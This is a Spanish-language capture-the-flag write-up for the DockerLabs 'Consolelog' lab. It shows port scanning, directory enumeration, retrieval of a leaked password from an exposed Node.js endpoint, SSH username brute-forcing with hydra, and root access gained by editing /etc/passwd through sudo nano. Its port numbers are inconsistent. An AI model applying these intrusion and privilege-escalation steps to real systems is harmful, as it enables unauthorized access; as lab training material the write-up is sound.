---
title: Consolelog - DockerLabs
published: true
categories: DockerLabs
---

| OS     | Dificultad  | Creator              |
| ------ | ----------- | -------------------- |
| Linux  | Fácil      | El Pingüino de Mario |

# Reconocimiento Inicial

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo.

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports
```

- `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/463bc887-458f-4249-9e04-50b15ab5aa57)

Durante el escaneo, descubrimos que los puertos abiertos son:
- `8080` (HTTP)
- `3000` (Node.js)
- `5000` (SSH)

# Enumeración de Servicios

A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad y obtenemos más información sobre los servicios asociados a estos puertos.

```bash
nmap -p80,3000,5000 -sCV 172.17.0.2 -oG targeted  
```

![image](https://github.com/user-attachments/assets/21950d80-3e56-42ca-ad50-6b960f9d72da)

# Exploración Web

Al navegar al puerto `80`, descubrimos un sitio web con el título "Mi sitio web" y un botón etiquetado como "Botón en fase beta".

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```

- `gobuster dir`: Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/`: Especifica la URL objetivo que deseas escanear.
- `-w`: Especifica el diccionario a utilizar.
- `-x`: Indica los tipos de extensiones que deseas buscar.

![image](https://github.com/user-attachments/assets/5d7cea6b-7108-49a9-be4b-2ba3959af3c2)

Encontramos una ruta llamada `/backend`, la cual contiene varios archivos. Uno de ellos es `server.js`, que revela la configuración del servicio Node.js en el puerto 3000.

```javascript
const express = require('express');
const app = express();

const port = 3000;

app.use(express.json());

app.post('/recurso/', (req, res) => {
    const token = req.body.token;
    if (token === 'tokentraviesito') {
        res.send('lapassworddebackupmaschingonadetodas');
    } else {
        res.status(401).send('Unauthorized');
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Backend listening at http://consolelog.lab:${port}`);
});
```

Este código indica que en el puerto `3000`, al enviar una petición POST a la ruta `/recurso` con un cuerpo JSON que contenga el token `tokentraviesito`, se nos devolverá la cadena `lapassworddebackupmaschingonadetodas`.

Realizamos la petición con `curl`:

```bash
curl -X POST http://172.17.0.2:3000/recurso/ -H "Content-Type: application/json" -d '{"token": "tokentraviesito"}'  
```

![image](https://github.com/user-attachments/assets/51ba41bb-66af-44be-9522-63cceabdeb9f)

Obtuvimos la contraseña `lapassworddebackupmaschingonadetodas`. Aunque aún no sabemos a qué pertenece, intentamos realizar fuerza bruta en el servicio SSH utilizando `hydra` para buscar un usuario válido.

```bash
hydra -L /usr/share/wordlists/rockyou.txt  -p "lapassworddebackupmaschingonadetodas" ssh://172.17.0.2:5000 -t 4
```

![image](https://github.com/user-attachments/assets/3e733dac-0c6d-4864-a4f8-ad413cf5d71a)

Encontramos el usuario `lovely`.

# Escalación de Privilegios

Tras acceder como `lovely`, ejecutamos `sudo -l` y verificamos que podemos ejecutar `nano` como `root`:

![image](https://github.com/user-attachments/assets/788a4abb-a227-4378-924a-ae8882fd174d)

Usamos `nano` para modificar el archivo `/etc/passwd` y eliminar la `x` del usuario `root`. Esto elimina la solicitud de contraseña al iniciar sesión como `root`.

![image](https://github.com/user-attachments/assets/5c3f49dc-018b-4924-9df9-57446f6dc032)

Finalmente, ejecutamos:

```bash
su root
```

Ahora tenemos acceso como usuario `root`.

![image](https://github.com/user-attachments/assets/2ff5985e-9af5-47d2-a01f-48c66cc44789)

